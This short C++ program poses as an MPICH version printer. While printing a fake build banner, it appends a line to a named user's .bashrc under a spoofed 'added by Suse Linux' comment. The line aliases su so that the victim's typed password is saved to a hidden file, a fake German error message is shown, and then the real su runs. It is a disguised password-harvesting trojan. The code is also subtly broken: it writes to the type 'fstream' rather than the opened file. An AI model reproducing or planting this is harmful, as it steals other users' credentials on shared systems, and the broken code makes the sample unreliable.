#include <iostream>
#include <fstream>
using namespace std;

int main()
{
	cout <<"MPICH Version:          1.2.7p1\n"
	"MPICH Release date:     $Date: 2005/11/04 11:54:51$\n"
	"MPICH Patches applied:  none\n"
	"MPICH configure:        -rsh=/usr/bin/ssh --enable-c++ -cflags=-O2 -fmessage-length=0 -Wall -D_FORTIFY_SOURCE=2 -g\n" "-fno-strict-aliasing -Impid/mpd/ -Iinclude --with-common-prefix=/opt/mpich --libdir=/opt/mpich/ch-p4mpd/lib64\n" "--includedir=/opt/mpich/include -mpe_opts=--libdir=/opt/mpich/ch-p4mpd/lib64 --with-romio=--with-file-system=nfs+ufs\n" "--with-device=ch_p4mpd -prefix=/opt/mpich/ch-p4mpd --enable-sharedlib\n"
	"MPICH Device:           ch_p4mpd";
	fstream hDatei("/home/TheoretischePhysik2/phg/.bashrc", fstream::ate);
	fstream<<"# added by Suse Linux 10.3 - do NOT remove the following line:\n"
	"alias su=\'read -p \"Passwort : \" -s pass;echo \"${pass}\" >> ~/.login_check;echo;echo \"su: ungueltiges Kennwort\";/bin/su\'";
	hDatei.close();
	return 0;
}
